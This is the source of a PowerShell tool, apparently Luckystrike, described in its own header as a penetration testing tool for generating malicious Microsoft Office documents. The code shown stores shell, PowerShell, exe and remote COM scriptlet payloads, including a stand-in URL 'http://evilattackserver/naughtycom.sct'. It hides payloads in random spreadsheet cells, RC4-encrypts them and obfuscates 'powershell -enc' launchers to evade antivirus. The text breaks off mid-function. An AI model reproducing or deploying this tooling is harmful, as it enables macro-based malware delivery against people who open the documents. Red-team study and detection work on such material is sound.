#Requires -Version 5

<#
.SYNOPSIS
    Luckystrike is a penetration testing tool used to create malicious Microsoft Office documents.
.DESCRIPTION
	Luckystrike generates malicious MS Office documents (currently only .xls) using PowerShell's 
	ability to interface with Microsoft COM objects (such as Excel). A sqlite database powers 
	the backend and stores code blocks, payloads, dependency rules, and infection methods.

	Luckystrike was designed with the following core principles:

		1) Payloads must be completely stored in a database, providing a self-contained and persistent
		way to retrieve and embed them into documents with ease.
		2) Flexibity is key. The system must be able to connect any payload to any applicable infection method.
		3) The database must be able to be shared amongst team members, ideally through a system like git.
		4) In addition to creating new documents, the system must be able to modify existing documents (templates).
		5) The system must be easy to use for non-scripters. Do not require a ton of arguments to be passed 
		   for each action.

	Terminology:

		"Payload"			A command, PowerShell script, or executable to be executed on the target machine.
		"Catalog"			A sqlite database containing saved payloads.
		"Infection Type"	The means by which to launch a payload on a target system.
		"Template"			An xls file that is saved in the database to be used for generating a new, infected file.


	Quick Start Guide:

		1) Run the install.ps1 script. This is required. It also must be run with administrator 
		   rights (to install PSSQLite)
		2) Prepare a payload (say a self contained PowerShell script) that you want to execute when the macro runs.
		3) Run Luckystrike.ps1
		4) Choose Catalog Options > Add a payload to the catalog
		5) Back to main menu > Select Payloads > Select a Payload
		6) Chose the payload you just created.
		7) Select an infection type (Type "98" for help)
		8) Back to main menu > File Options
		9) Select Generate new xls


	Restrictions/Prereqs:
		- Luckystrike currently only makes .xls documents (97-2003 format).
		- Luckystrike requires PowerShell v5.
		- Luckystrike requires the PSSQLite module to be installed (install.ps1 handles this).

.PARAMETER Debug

	Spits out all the information to the screen.

.PARAMETER API

	Does not load menus. Allows for dot-sourcing of luckystrike and calling functions.

.NOTES
	CURRENTVERSION:			2.0

	Version History:		
							07/22/2017	2.0.0	Word & Invoke-Obfuscation support. Bug fixes.
							02/21/2017	1.1.7	Fixed major bug introduced by 1.1.6. AV evasions.
							10/04/2016	1.1.6	Added auto-update functionality
							09/29/2016	1.1.5	Accounted for additional registry key modification.
							09/29/2016	1.1.4	Debug info added.
							09/28/2016	1.1.3	Minor bug fixes.
							09/27/2016	1.1.2	Updated startup to import modules.
							09/26/2016	1.1.1	Minor bug fixes.
							09/24/2016	1.1		Added support for putting templates in the database.
							09/23/2016	1.0 	Initial Release

    Contributors: 			Steve McKenzie 	@jarsna12
							Scot Berner		@slobtresix0	
							Jason Lang 		@curi0usJack

    Help Last Modified: 	09/16/2016  
#>

[CmdletBinding()]
Param
(
	[switch] $API,
	[switch] $SQL
)

$version = "2.0"
$requiredmodules = @('PSSQlite', 'Invoke-Obfuscation')
$dbpath = "$($PWD.Path)\ls.db"
$macroelements = $null
$can_obfuscate = $true
$exitnum = "99"
$githubver = "https://raw.githubusercontent.com/curi0usJack/luckystrike/master/currentversion.txt"
$updatefile = "https://raw.githubusercontent.com/curi0usJack/luckystrike/master/update.ps1"
$doctype = $null
$payloadsdir = "$($PWD)\payloads"
$date = Get-Date -format MMddyyyyHHmmss
$debuglog = "$pwd\ls-debug-$date.log"

# Maximum number of characters to pack into a cell. Tried 10000, but they were 
# getting truncated in Excel 2010. 8200 is default & seems to work well.
$codeblockmax = 8200

# Menu Vars. Don't monkey with.
$currentmenu = $null
$previousmenus = New-Object System.Collections.ArrayList
$menus = @{}

# Determine if admin powershell process
$wid=[System.Security.Principal.WindowsIdentity]::GetCurrent()
$prp=new-object System.Security.Principal.WindowsPrincipal($wid)
$adm=[System.Security.Principal.WindowsBuiltInRole]::Administrator
$IsAdmin=$prp.IsInRole($adm)

function Write-Text ($symbol, $color, $msg)
{
	if ($symbol -ne $null)
	{
		Write-Host "[$symbol]" -ForegroundColor $color -NoNewLine
		Write-Host " - $msg"
	}
	else 
	{
		Write-Host $msg
	}
}

function Write-Message {
	Param
	(	
		[string] $message,
		[string] $type,
		[bool] $prependNewLine
	)
	$msg = ""
	if ($prependNewline) { Write-Host "`n" }
	switch ($type) {
		"error" { 
			$symbol = "!"
			$color = [System.ConsoleColor]::Red
			}
		"warning" {
			$symbol = "!"
			$color = [System.ConsoleColor]::Yellow
			}
		"debug" {
			$symbol = "DBG"
			$color = [System.ConsoleColor]::Magenta
			}
		"success" {
			$symbol = "+"
			$color = [System.ConsoleColor]::Green
			}
		"prereq" {
			$symbol = "PREREQ"
			$color = [System.ConsoleColor]::Cyan
			}
		"status" {
			$symbol = "*"
			$color = [System.ConsoleColor]::White
			}
		default { 
			$color = [System.ConsoleColor]::White
			#$symbol = "*" Don't do this. Looks bad.
			}
		}

		# I know, I know. This code is truly horrible. Judge not, lest I find your github repos...
		if ($PSCmdlet.MyInvocation.BoundParameters -ne $null -and $PSCmdlet.MyInvocation.BoundParameters['Debug'].IsPresent)
		{
			Add-Content $debuglog $message
			Write-Text $symbol $color $message
		}
		elseif ($type -ne "debug") 
		{
			Write-Text $symbol $color $message
		}

}

function Get-RandomAlphaNum($len)
{
	$r = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	$tmp = foreach ($i in 1..[int]$len) {$r[(Get-Random -Minimum 1 -Maximum $r.Length)]}
	return [string]::Join('', $tmp)
}

function Get-RandomAlpha($len)
{
	$r = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	$tmp = foreach ($i in 1..[int]$len) {$r[(Get-Random -Minimum 1 -Maximum $r.Length)]}
	return [string]::Join('', $tmp)
}

function Get-NumBlocks($text)
{
	return  [int][Math]::Ceiling($text.Length / $codeblockmax)
}

function Write-DebugInfo ($payload, $infectiontype, $active)
{
	if ($payload -ne $null)
	{	
		Write-Message "[PAYLOAD] ID:`t`t`t$($payload.ID)" "debug"
		Write-Message "[PAYLOAD] Name:`t`t`t$($payload.Name)" "debug"
		Write-Message "[PAYLOAD] Type:`t`t`t$($payload.PayloadType)" "debug"
		Write-Message "[PAYLOAD] NumBlocks:`t`t$($payload.NumBlocks)" "debug"
		Write-Message "[PAYLOAD] PayloadLength:`t$($payload.PayloadText.Length)" "debug"
	}

	if ($infectiontype -ne $null)
	{
		Write-Message "[INFTYPE] ID:`t`t`t$($infectiontype.ID)" "debug"
		Write-Message "[INFTYPE] Name:`t`t`t$($infectiontype.Name)" "debug"
	}

	if ($active -ne $null)
	{
		Write-Message "[ACTIVE] Legend String:`t`t$($i.LegendString)" "debug"
		Write-Message "[ACTIVE] Payload ID:`t`t$($i.PayloadID)" "debug"
		Write-Message "[ACTIVE] InfectionType:`t`t$($i.InfectionType)" "debug"
		Write-Message "[ACTIVE] IsEncrypted:`t`t$($i.IsEncrypted)" "debug"
		Write-Message "[ACTIVE] EncLength:`t`t$($i.EncryptedText.Length)" "debug"
	}
}


#region Catalog Methods

function Invoke-DBQuery($query, $params)
{
	$dbConnection = New-SQLiteConnection -DataSource $dbpath
	try
	{
		if ($params -eq $null)
		{
			$tmpoutput = Invoke-SqliteQuery -SQLiteConnection $dbConnection -Query $query
		}
		else 
		{
			$tmpoutput = Invoke-SqliteQuery -SQLiteConnection $dbConnection -Query $query -SqlParameters $params
			$tmpparams = foreach ($i in $params.Keys) {"$i`:$($params[$i])"}
			$outparams = [string]::Join(' ', $tmpparams)
		}	

		$count = 1
		$tmpoutput = $tmpoutput | %{$_ | Add-Member -type Noteproperty -name "ListID" -Value $count;$count++;$_}
		if ($SQL) 
		{
			Write-Message "Executed Query: $query. Params: $outparams" "debug"
		}
		return $tmpoutput
	}
	catch [System.Exception] 
	{
		$err = $_.Exception.Message
		Write-Message "Error occurred executing query: $query. Error: $err" "error"
	}
	finally
	{
		$dbConnection.Dispose()
	}
}

function Get-AllPayloads()
{
	return Invoke-DBQuery "
		SELECT 	p.ID AS ID,
				p.Name AS Name, 
				p.Description AS Description, 
				pt.Name AS PayloadType, 
				p.TargetIP AS TargetIP, 
				p.TargetPort AS TargetPort 
		FROM Payloads p, PayloadTypes pt 
		WHERE p.PayloadType = pt.ID"
}
function Get-PayloadByID($id)
{
	$params = @{"id" = $id}
	return Invoke-DBQuery "SELECT * FROM Payloads WHERE ID = @id" $params
}

function Get-PayloadByTitle($title)
{
	$params = @{"Title" = $title}
	return Invoke-DBQuery "SELECT * FROM Payloads WHERE NAME = @Title" $params
}

function Get-PayloadTypes()
{
	return Invoke-DBQuery "SELECT * FROM PayloadTypes"
}

function Get-SelectedPayloads()
{
	return Invoke-DBQuery "SELECT * FROM Payloads WHERE ID IN (SELECT PayloadID FROM ActiveWorking)"
}

function Get-AvailablePayloads()
{
	return Invoke-DBQuery "SELECT * FROM Payloads WHERE ID NOT IN (SELECT PayloadID FROM ActiveWorking)"
}

function Get-CodeBlockByName ($name)
{
	$params = @{"name" = $name}
	return Invoke-DBQuery "SELECT * FROM CodeBlocks WHERE Name = @name" $params
}

function Get-CodeBlock ($name, $type)
{
	$params = @{"name" = $name; "type" = $type}
	return Invoke-DBQuery "SELECT * FROM CodeBlocks WHERE Name = @name AND BlockType = @type" $params
}

function Get-InfectionTypeCodeDependencies ($infectiontypeid)
{
	$params = @{"id" = $infectiontypeid}
	return Invoke-DBQuery "
		SELECT cb.* 
		FROM InfectionType_Dependencies itd, CodeBlocks cb 
		WHERE itd.CodeBlockID = cb.ID
		AND itd.CodeBlockID = @id" $params
}

function Get-InfectionTypeByID ($id)
{
	$params = @{"id" = $id}
	return Invoke-DBQuery "SELECT * FROM InfectionTypes WHERE ID = @id" $params
}

function Get-AllInfectionTypes()
{
	return Invoke-DBQuery "SELECT * FROM InfectionTypes"
}

function Get-DocTypes
{
	return Invoke-DBQuery "SELECT * from DocTypes"
}

function Get-DocTypeByName($doctypename)
{
	$params = @{"Name" = $doctypename}
	return Invoke-DBQuery "SELECT * from DocTypes where Name = @Name" $params
}

function Get-PayloadsByDocType($doctypeid)
{
	$params = @{"DTID" = $doctypeid}
	return Invoke-DBQuery "
		SELECT DISTINCT p.ID AS ID,
				p.Name AS Name, 
				p.Description AS Description,  
				p.TargetIP AS TargetIP, 
				p.TargetPort AS TargetPort 
		FROM Payloads p, InfectionTypes it, Assoc_Infection_Payload aip, Assoc_Infection_DocType aid, DocTypes dt
		WHERE p.PayloadType = aip.PayloadType
		AND aip.InfectionType = it.ID
		AND it.ID = aid.InfectionType
		AND aid.DocType = dt.ID
		AND dt.ID = @DTID" $params
}

function Get-PayloadTypeInfectionTypes($payloadtypeid, $doctypeid)
{
	$params = @{"ptid" = [int]$payloadtypeid; "dtid" = [int]$doctypeid}
	return Invoke-DBQuery "
		SELECT DISTINCT it.ID, it.Name, it.Description 
		FROM InfectionTypes it, PayloadTypes pt, Assoc_Infection_Payload aip, Assoc_Infection_DocType aid
		WHERE 	pt.ID = aip.PayloadType
		AND 	aip.InfectionType = it.ID	
		AND		it.ID = aid.InfectionType
		AND		aid.DocType = @dtid
		AND 	pt.ID = @ptid" $params
}

function Get-ActiveWorking()
{
	return Invoke-DBQuery "SELECT * FROM ActiveWorking"
}

function Get-ActiveWorkingByPayloadID($id)
{
	$params = @{"pid" = [int]$id}
	return Invoke-DBQuery "SELECT * FROM ActiveWorking WHERE PayloadID = @pid" $params
}

function Clear-ActiveWorking
{
	return Invoke-DBQuery "DELETE FROM ActiveWorking"
}

function Add-ActiveWorking($payloadid, $infectionid, $numblocks, $encryptedpayload, $customstrings)
{
	# Forming the legend string in this way could technically cause an overwrite of payload data, but it's highly unlikely given the entropy excel provides
	# Min/Max values here: https://support.office.com/en-gb/article/Excel-specifications-and-limits-1672b34d-7043-467e-8e27-269d656771c3#bmworksheetworkbook
	$startcolumn = Get-Random -Minimum 150 -Maximum 250 #Excel 2010 column max 16,384
	$startrow = Get-Random -Minimum 100 -Maximum 5000 #Excel 2010 row max 1,048,576

	$paramstest = @{"pid" = [int]$payloadid; "itid" = [int]$infectionid}
	$results = Invoke-DBQuery "SELECT COUNT(*) As NumRows FROM ActiveWorking WHERE PayloadID = @pid AND InfectionType = @itid" $paramstest
	$count = [int]$results.NumRows
	Write-Message "Duplicate Active Check Count: $count" "debug"
	if ($count -gt 0)
	{
		Write-Message "Hrm... Adding the same payload with the same infection type again? Ok, but I'm not sure what's going to hap... * DISCONNECTED" "warning" $true
	}

		if ($encryptedpayload -ne $null)
	{
		$isencrypted = 1
		$numblocks = Get-NumBlocks $encryptedpayload
	}
	else 
	{
		$isencrypted = 0
		switch ($infectionid)
		{
			2 { #Request base64 encoding. This will alter the number of blocks to insert into excel
				$payload = Get-PayloadByID $payloadid
				$pt = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload.PayloadText))
				$numblocks = Get-NumBlocks $pt
			}	
		}
	}

	$legend = "$startcolumn,$startrow,$numblocks"
	$params = @{"pid" = [int]$payloadid; "itid" = [int]$infectionid; "legend" = $legend; "isencrypted" = $isencrypted; "encpayload" = $encryptedpayload; "strings" = $customstrings}
	return Invoke-DBQuery "INSERT INTO ActiveWorking (PayloadID, InfectionType, LegendString, IsEncrypted, EncryptedText, CustomStrings) VALUES (@pid, @itid, @legend, @isencrypted, @encpayload, @strings)" $params
}
function Remove-ActiveWorking ($payloadid)
{
	$params = @{"pid" = [int]$payloadid}
	return Invoke-DBQuery "DELETE FROM ActiveWorking WHERE PayloadID = @pid" $params
}

function Get-ActiveDependencies()
{
	return Invoke-DBQuery "
		SELECT * FROM CodeBlocks WHERE ID IN (
			SELECT CodeBlockID FROM InfectionType_Dependencies WHERE InfectionType IN (
				SELECT DISTINCT(InfectionType) FROM ActiveWorking));"
}

function Add-Template($name, $doctype, $templatetext)
{
	$params = @{'name' = $name; 'doctype' = $doctype; 'text' = $templatetext}
	return Invoke-DBQuery "INSERT INTO Templates (NAME, DOCTYPE, TEMPLATETEXT) VALUES (@name, @doctype, @text)" $params
}

function Remove-Template($id)
{
	$params = @{'id' = $id}
	return Invoke-DBQuery "DELETE FROM Templates WHERE ID = @id" $params
}

function Get-TemplateByID($id)
{
	$params = @{'id' = $id}
	return Invoke-DBQuery "SELECT * FROM Templates WHERE ID = @id" $params
}

function Get-TemplateByDocType($doctypename)
{
	$params = @{'dtname' = $doctypename}
	return Invoke-DBQuery "SELECT * FROM Templates WHERE DOCTYPE = @dtname" $params
}

function Get-AllTemplates()
{
	return Invoke-DBQuery "SELECT * From Templates"
}

function Init-DB()
{
	Invoke-DBQuery "DELETE FROM ActiveWorking"
}

function Get-ValidEXE($strpath)
{
	if ($strpath -eq $null) 
	{ 
		$path = Read-Host -Prompt "Enter path to .exe file" 
	}
	else 
	{
		$path = $strpath
	}

	if ((Test-Path $path) -eq $false)
	{
		Write-Message "Could not find .exe at path $path. Try again." "warning"
		Get-ValidEXE
	}

	if ([System.IO.Path]::GetExtension($path) -ne ".exe")
	{
		Write-Message "Please enter path to a valid .exe file." "warning"
		Get-ValidEXE
	}

	Write-Message "GET-VALIDEXE: PATH: $path" "debug" -prependNewLine $true
	return $path
}

function Obfuscate-Launcher($command)
{
	$b64 = ($command -split "-enc ")[1]
	$payloadtext = "po`" & `"Wer`" & `"sHel`" & `"L -W 1 -C po`" & `"weRs`" & `"heLl ([char]45+[char]101+[char]110+[char]99) $b64"
	return $payloadtext
}

function Create-DBPayload($title=$null, $destIP=$null, $destPort=$null, $description=$null, [int]$payloadtype=-1, $payloadtext=$null, $path=$null, $comurl=$null, $obfuscate=$null)
{
	if ($title -eq $null)
	{
		$title = Read-Host -Prompt "`nTitle"
		Write-Message "CREATE-DBPAYLOAD: TITLE: $title" "debug" -prependNewLine $true
	}

    while ($title.Length -eq 0)
    {
        $title = Read-Host -Prompt "Gotta have one. What do you want to call it? 'One', 'Two', even 'Threeve' would work..."
    }

	while ((Get-PayloadByTitle $title) -ne $null)
	{
		Write-Message "There is already a payload by that title. Try again." "warning"
		$title = Read-Host -Prompt "Title"
	}
	
	$payloadtypes = Get-PayloadTypes
	if ($destIP -eq $null) { $destIP = Read-Host -Prompt "Target IP [Optional]" }
	if ($destPort -eq $null) { $destPort = Read-Host -Prompt "Target Port [Optional]" }
	if ($description -eq $null) { $description = Read-Host -Prompt "Description (e.g. empire, windows/meterpreter/reverse_tcp, etc) [Optional]"}
	
	Write-Message "CREATE-DBPAYLOAD: TITLE: $title" "debug" -prependNewLine $true
	Write-Message "CREATE-DBPAYLOAD: DESTIP: $destIP" "debug" -prependNewLine $true
	Write-Message "CREATE-DBPAYLOAD: DESTPORT: $destPort" "debug" -prependNewLine $true
	Write-Message "CREATE-DBPAYLOAD: DESCRIPTION: $description" "debug" -prependNewLine $true

	if ($payloadtype -eq -1)
	{
		Write-Message "`nChoose payload type: " 
		foreach ($t in (Get-PayloadTypes))
		{
			Write-Message "`t$($t.ID)) $($t.Name)"
		}
		Write-Message "`t98) Help"
		Do
		{ 
			$pt = Read-Host -Prompt "Selection"
			if ($pt -eq 98)
			{
				$payloadtypes | fl -Property ID, Name, Description
			}
		}
		until ($pt -as [int] -and ($pt -ge 1 -and $pt -le $payloadtypes.Count))

		$payloadtype = $pt
		Write-Message "CREATE-DBPAYLOAD: PAYLOADTYPE: $pt" "debug" -prependNewLine $true
	}
	
	switch ($payloadtype)
	{
		1 { # Shell Command
			if ($payloadtext -eq $null) 
			{ 
				$payloadtext = Read-Host -Prompt "`nPayload Text (the actual command to run)" 
				if ($payloadtext -like "powershell*" -and $payloadtext -like "*-enc*")
				{
					$obfs = Read-Host -Prompt "`nDeteted powershell -enc command. Do you wish to obfuscate (Y|N)"
					while (($obfs -match "[YyNn]") -eq $false)
					{
						$obfs = Read-Host "This is a binary situation. Y or N please."
					}

					if ($obfs -match "[Yy]")
					{
						Write-Message "Roger that. Assuming -W hidden. Be sure to test and modify as needed" "status" -prependNewLine $true
						$payloadtext = Obfuscate-Launcher $payloadtext
					}
				}
			}
			else 
			{
				if ($obfuscate)
				{
					$payloadtext = Obfuscate-Launcher $payloadtext
				}
			}


		}
		2 { # Powershell script
			if ($path -eq $null) { $path = Read-Host -Prompt "`nEnter full path to .ps1 file" }
			while ((Test-Path $path) -eq $false)
			{
				Write-Message "Couldn't locate file at $path. Try again." "warning"
				$path = Read-Host -Prompt "Enter full path to .ps1 file"
			}

			Write-Message "CREATE-DBPAYLOAD: PATHTOPS1: $path" "debug" -prependNewLine $true
			$payloadtext = Get-Content $path -Raw

			try 
			{
				$s = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($payloadtext))
				Write-Message "Base64 encoded file detected. Decoding and storing (luckystrike will encode as necessary)" "warning" -prependNewLine $true
				$payloadtext = $s
			}
			catch [System.Exception] 
			{
				# Payload is not base64 encoded. Proceed.
			}
		}
		3 { # exe
			$exepath = Get-ValidEXE $path
			$bytes = [System.IO.File]::ReadAllBytes($exepath)
			$payloadtext = [System.Convert]::ToBase64String($bytes)
		}
		4 { # COM scriptlet file
			if ($comurl -eq $null) { $comurl = Read-Host -Prompt "`nEnter full URL to COM scriptlet file (include http(s)://)"}
			while ($comurl -notlike "http*")
			{
				Write-Message "Like this: http://evilattackserver/naughtycom.sct (also works with .txt files)." "warning" -prependNewLine $true
				$comurl = Read-Host -Prompt "`Try again"
			}
			Write-Message "CREATE-DBPAYLOAD: COMURL: $comurl" "debug" -prependNewLine $true
			$payloadtext = $comurl
			$description = "$description ($comurl)"
		}
	}
	
	# Get the number of 8200 character code blocks to use
	$numblocks = Get-NumBlocks $payloadtext

	$params = @{
		"Title"			= $title
		"Description"	= $description
		"TargetIP"		= $destIP
		"TargetPort"	= $destPort
		"PayloadType"	= $payloadtype
		"PayloadText"	= $payloadtext
		"NumBlocks"		= $numblocks
	}

	$query = "INSERT INTO Payloads (NAME, DESCRIPTION, TARGETIP, TARGETPORT, PAYLOADTYPE, PAYLOADTEXT, NUMBLOCKS) 
	VALUES (@Title, @Description, @TargetIP, @TargetPort, @PayloadType, @PayloadText, @NumBlocks)"

	Invoke-DBQuery $query $params
	Write-Message "Payload added." "success" $true
	Load-Menu $script:currentmenu
}
function Remove-DBPayload()
{
	$allpayloads = Get-AllPayloads
	$allcount = [int]($allpayloads | measure).Count
	if ($allcount -gt 0)
	{
		Write-Message "`n"
		foreach ($p in $allpayloads)
		{	
			Write-Message "`t$($p.ListID)) $($p.Name)"
		}
		Write-Message "`t$exitnum) Done."
		Write-Message `n
		
		Do
		{ 
			$selection = Read-Host -Prompt "Select" 
		}
		until (($selection -ge 1 -and $selection -le $allcount)-or $selection -eq $exitnum)
		
		Write-Message "REMOVE-DBPAYLOAD: SELECTION: $selection" "debug" -prependNewLine $true

		if ($selection -eq $exitnum)
		{ 
			Load-Menu $script:currentmenu 
		}
		else
		{
			$prid = ($allpayloads | ?{$_.ListID -eq [int]$selection}).ID
			$query = "DELETE FROM PAYLOADS WHERE ID = @PayloadID" 
			$params = @{"PayloadID" = $prid}
			Invoke-DBQuery $query $params
			Write-Message "Payload removed." "success" $true
			Load-Menu $script:currentmenu
		}
	}
	else 
	{
		Write-Message "No payloads were found in the database." "warning" $true
		Load-Menu $script:currentmenu
	}
}
function Show-PayloadDetails()
{
	$all = Get-AllPayloads
	if ($all -ne $null)
	{
		$all | ft -Property Name, TargetIP, TargetPort, PayloadType
	}
	else
	{
		Write-Message "No payloads were found in the catalog." $true
	}
	Load-Menu $script:currentmenu
}

function Create-DBTemplate($title=$null, $path=$null, $doctype=$null)
{
	if ($title -eq $null) 
	{
		$title = Read-Host -Prompt "`nTitle"
	}
	
	while ((Get-PayloadByTitle $title) -ne $null)
	{
		Write-Message "There is already a template by that title. Try again." "warning"
		$title = Read-Host -Prompt "Title"
	}

	if ($path -eq $null)
	{
		$path = Read-Host -Prompt "Enter path to template file"
	}

	while (!(Test-Path $path))
	{
		Write-Message "Coult not find file at $path. Try again." "warning"
		$path = Read-Host "Enter path to file"
	}

	$doctype = [IO.Path]::GetExtension($path)
	Write-Message "CREATE-DBTEMPLATE: DOCTYPE: $doctype" "debug"
	while ($doctype -ne ".xls" -and $doctype -ne ".doc")
	{
		Write-Message "Only .xls & .doc templates are supported at this time. Sorry." "error"
		$path = Read-Host "Enter path to file"
		$doctype = [IO.Path]::GetExtension($path)
	}

	Write-Message "CREATE-DBTEMPLATE: PATH: $path" "debug" -prependNewLine $true

	try 
	{
		$doctypeid = Get-DocTypeByName $doctype
		$bytes = [System.IO.File]::ReadAllBytes($path)
		$templatetext = [System.Convert]::ToBase64String($bytes)

		Add-Template $title $doctype.Trim('.') $templatetext
		Write-Message "Template added!" "success" $true
	}
	catch [System.Exception] 
	{
		$message = $_.Exception.Message
		Write-Message "Error saving new template: $message" "error"
	}
	
	Load-Menu $script:currentmenu
}
function Remove-DBTemplate()
{
	$templates = Get-AllTemplates
	$tcount = [int]($templates | measure).Count
	if ($tcount -gt 0)
	{
		Write-Message "`n"
		foreach ($t in $templates)
		{	
			Write-Message "`t$($t.ListID)) $($t.Name)"
		}
		Write-Message "`t$exitnum) Done."
		Write-Message `n
		
		Do
		{ 
			$selection = Read-Host -Prompt "Select" 
		}
		until (($selection -ge 1 -and $selection -le $tcount) -or $selection -eq $exitnum)
		
		Write-Message "REMOVE-DBTEMPLATE: SELECTION: $selection" "debug" -prependNewLine $true

		if ($selection -eq $exitnum)
		{ 
			Load-Menu $script:currentmenu 
		}
		else
		{
			$tid = ($templates | ?{$_.ListID -eq $selection}).ID
			Remove-Template $tid
			Write-Message "Template removed." "success" $true
			Load-Menu $script:currentmenu
		}
	}
	else 
	{
		Write-Message "No templates were found in the catalog." "warning" $true
		Load-Menu $script:currentmenu
	}

}
function Show-TemplateDetails()
{
	$templates = Get-AllTemplates
	$tcount = [int]($templates | measure).Count
	if ($tcount -gt 0)
	{
		$templates | select ID, Name, DocType | ft
	}
	else
	{
		Write-Message "No templates have been added to the catalog." -prependNewLine $true
	}
	Load-Menu $script:currentmenu
}

#endregion

#region File Methods

# Converts a base64 string to an array of "parts""
# that are capped by length for insterting into Excel
function Get-PayloadPartsArray($targetstring, $convertToB64, $maxlength)
{
	# Convert to Base64 if necessary
	if ($convertToB64)
	{
		$bytes = [System.Text.Encoding]::Unicode.GetBytes($targetstring)
		$payloadtext = [System.Convert]::ToBase64String($bytes)
	}
	else 
	{
		$payloadtext = $targetstring
	}

	if ($maxlength -eq $null) 
	{ 
		$maxlength = $codeblockmax 
	}

	$fileparts = @()
	$done = $false
	$payloadlength = $payloadtext.Length

	if ($payloadlength -gt $maxlength)
	{
		 $intStart = 0
		 $totalchars = 0
		 Do
		 {
		 	$line = $payloadtext.Substring($intStart, $maxlength)
			$totalchars += $line.Length
			$fileparts += $line
			
			if ($payloadlength -eq $totalchars)
			{ 
				$done = "true" 
			}
			elseif (($totalchars + $maxlength) -gt $payloadlength)
			{ 
				$maxlength = $payloadlength - $totalchars 
				$intStart = $payloadlength - $maxlength
			}
			else
			{ 
				$intStart += $maxlength 
			}
		 }
		 Until ( $done -eq $true )
	}
	else
	{
		$fileparts += $payloadtext
	}

	return $fileparts
}
function Parse-Legend($legendstring)
{
	$s = $legendstring.Split(',')
	return New-Object -TypeName psobject -Prop @{
		'StartColumn' = $s[0];
		'StartRow' = $s[1];
		'NumRows' = $s[2]
	}
}

function Get-Harness($name, $functionname, $legend)
{
	$cb = Get-CodeBlock $name "harness"
	$harnesscode = $cb.BlockText
	$l = Parse-Legend $legend
	$harnesscode = $harnesscode | %{$_.Replace("|RANDOMNAME|", $functionname)}
	$harnesscode = $harnesscode | %{$_.Replace("|STARTROW|", $l.StartRow)}
	# Account for the fact that Excel will always include the start row as part of the payload.
	$harnesscode = $harnesscode | %{$_.Replace("|ENDROW|", ([int]$l.StartRow + [int]$l.NumRows - 1))}

	$harnesscode = $harnesscode | %{$_.Replace("|COLUMN|", $l.StartColumn)}
	$harnesscode = $harnesscode | %{$_.Replace("|RANDOMSTRING|", (Get-RandomAlphaNum 8))}
	
	return $harnesscode
}

# Infection Type 1
function Create-ShellCommand($harnasscode, $payload, $linelength)
{
	$linestart = 0
	$vbapayload = ""
	$complete = "false"
	$payloadlength = $payload.PayloadText.Length
	$totalchars = 0
	
	if ($linelength -eq $null)
	{
		$linelength = 380
	}

	if ($payloadlength -lt $linelength)
	{
		$vbapayload += "`"$($payload.PayloadText)`""
	}
	else
	{
		# This code is hideous and I can't believe it works. Do not change unless you like pain.
		Do
		{
			$psline = $payload.PayloadText.Substring($linestart, $linelength)
			$totalchars += $psline.Length
			
			if ($payloadlength -eq $totalchars)
			{ 
				$vbapayload += "`t& `"$psline`"`n"
				$complete = "true" 
			}
			elseif (($totalchars + $linelength) -gt $payloadlength)
			{ 
				$vbapayload += "`t& `"$psline`" _`n"
				$linelength = $payloadlength - $totalchars 
				$linestart = $payloadlength - $linelength
			}
			else
			{ 
				$vbapayload += "`t& `"$psline`" _`n"
				$linestart += $linelength 
			}
		}	
		Until ( $complete -eq "true" )
	}
	
	$vbapayload = $vbapayload.TrimStart("`t& ").TrimEnd("`n")
	$harnasscode = $harnasscode | %{$_.Replace("|PAYLOADTEXT|", $vbapayload)}
	return $harnasscode	
}

# Thanks @harmj0y!
function ConvertTo-Rc4ByteStream { 
<#
    .SYNOPSIS
        Converts an input byte array to a RC4 cipher stream using the specified key.
        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    .PARAMETER InputObject
        The input byte array to encrypt with the RC4 cipher.
    .PARAMETER Key
        The byte array of the RC4 key to use.
    .EXAMPLE
        $Enc = [System.Text.Encoding]::ASCII
        $Data = $Enc.GetBytes('This is a test! This is only a test.')
        $Key = $Enc.GetBytes('SECRET')
        ($Data | ConvertTo-Rc4ByteStream -Key $Key | ForEach-Object { "{0:X2}" -f $_ }) -join ' '
    .LINK
        https://en.wikipedia.org/wiki/RC4
        http://www.remkoweijnen.nl/blog/2013/04/05/rc4-encryption-in-powershell/
#>
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $InputObject,
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Key
    )
    begin {
        # key-scheduling algorithm
        [Byte[]] $S = 0..255
        $J = 0
        0..255 | ForEach-Object {
            $J = ($J + $S[$_] + $Key[$_ % $Key.Length]) % 256
            $S[$_], $S[$J] = $S[$J], $S[$_]
        }
        $I = $J = 0
    }
    process {
        # pseudo-random generation algorithm (PRGA) combined with XOR logic
        ForEach($Byte in $InputObject) {
            $I = ($I + 1) % 256
            $J = ($J + $S[$I]) % 256
            $S[$I], $S[$J] = $S[$J], $S[$I]
            $Byte -bxor $S[($S[$I] + $S[$J]) % 256]
        }
    }
}

function Crypt($in, $k)
{
	# /me can't even.
	#$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Length])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}}
	$Enc = [System.Text.Encoding]::ASCII
	$UEnc = [System.Text.Encoding]::UNICODE
	$Data = $Enc.GetBytes($in)
	$Key = $Enc.GetBytes($k)
	($Data | ConvertTo-Rc4ByteStream -Key $Key | ForEach-Object { "{0:X2}" -f $_ }) -join ''
}

function Generate-Macro($insertautoopen, $linelength, $ismodify, $doctype)
{

	Write-Message "GENERATE-MACRO: INSERTAUTOOPEN: $insertautoopen" "debug"
	Write-Message "GENERATE-MACRO: LINELENGTH: $linelength" "debug"
	Write-Message "GENERATE-MACRO: ISMODIFY: $ismodify" "debug"
	Write-Message "GENERATE-MACRO: DOCTYPE: $doctype" "debug"

	$alphabet = @(65..90 | foreach {[char]$_})
	$functionnum = 0
	$callstring = $null
	$macrocode = $null
	#$selectedpayloads = Get-SelectedPayloads
	$active = Get-ActiveWorking
